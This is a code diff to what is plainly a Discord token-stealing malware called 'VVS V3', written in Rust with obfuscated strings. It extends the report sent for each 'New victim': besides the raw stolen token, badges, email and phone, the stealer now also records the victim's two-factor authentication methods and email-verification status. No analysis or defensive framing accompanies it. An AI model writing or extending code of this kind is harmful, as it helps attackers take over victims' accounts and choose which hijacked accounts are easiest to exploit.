@@ -20,6 +20,34 @@ struct DdU {
     public_flags: u64,
     email: String,
     phone: String,
+    mfa_enabled: bool,
+    mfa_detail: String,
+    email_verified: bool,
+}
+
+fn mfa_status(json: &Value) -> (bool, String) {
+    let enabled = json["mfa_enabled"].as_bool().unwrap_or(false);
+    if !enabled {
+        return (false, obfstr!("Disabled").to_string());
+    }
+
+    let mut methods = Vec::new();
+    if let Some(types) = json.get("authenticator_types").and_then(|t| t.as_array()) {
+        for entry in types {
+            match entry.as_u64() {
+                Some(1) => methods.push(obfstr!("Authenticator App").to_string()),
+                Some(2) => methods.push(obfstr!("SMS").to_string()),
+                _ => {}
+            }
+        }
+    }
+
+    let detail = if methods.is_empty() {
+        obfstr!("Enabled").to_string()
+    } else {
+        format!("{} ({})", obfstr!("Enabled"), methods.join(", "))
+    };
+    (true, detail)
 }
 
 async fn vt(client: &reqwest::Client, token: &str) -> Option<DdU> {
@@ -39,6 +67,8 @@ async fn vt(client: &reqwest::Client, token: &str) -> Option<DdU> {
         let public_flags = json["public_flags"].as_u64().unwrap_or(0);
         let email = json["email"].as_str().unwrap_or("N/A").to_string();
         let phone = json["phone"].as_str().unwrap_or("N/A").to_string();
+        let email_verified = json["verified"].as_bool().unwrap_or(false);
+        let (mfa_enabled, mfa_detail) = mfa_status(&json);
 
         Some(DdU {
             id,
@@ -48,6 +78,9 @@ async fn vt(client: &reqwest::Client, token: &str) -> Option<DdU> {
             public_flags,
             email,
             phone,
+            mfa_enabled,
+            mfa_detail,
+            email_verified,
         })
     } else {
         None
@@ -243,6 +276,12 @@ async fn collect_discord_embeds(client: &reqwest::Client) -> Vec<Value> {
                     } else {
                         badges_display
                     };
+                    let mfa_display = format!("`{}`", user.mfa_detail);
+                    let verified_display = if user.email_verified {
+                        obfstr!("Verified").to_string()
+                    } else {
+                        obfstr!("Not verified").to_string()
+                    };
 
                     embeds.push(json!({
                         "title": "<a:clown:1366404450436124702> New victim <a:clown:1366404450436124702>",
@@ -254,7 +293,9 @@ async fn collect_discord_embeds(client: &reqwest::Client) -> Vec<Value> {
                             { "name": "<a:flecheblanche:1482614586413682730> Source", "value": name.to_string(), "inline": false },
                             { "name": "<a:flecheblanche:1482614586413682730> Token", "value": format!("```{}```", token), "inline": false },
                             { "name": "<a:all_discord_badges_gif:1157698511320653924> Badges", "value": final_badges, "inline": false },
-                            { "name": "<a:dark_butterfly:1441101545465974935> Email", "value": format!("`{}`", user.email), "inline": false },
+                            { "name": "<a:dark_butterfly:1441101545465974935> Email", "value": format!("`{}`", user.email), "inline": true },
+                            { "name": "<a:dark_butterfly:1441101545465974935> Email verified", "value": format!("`{verified_display}`"), "inline": true },
+                            { "name": "<a:dark_butterfly:1441101545465974935> 2FA", "value": mfa_display, "inline": true },
                             { "name": "<a:dark_butterfly:1441101545465974935> Phone", "value": format!("`{}`", user.phone), "inline": false }
                         ],
                         "footer": { "text": "VVS V3" },
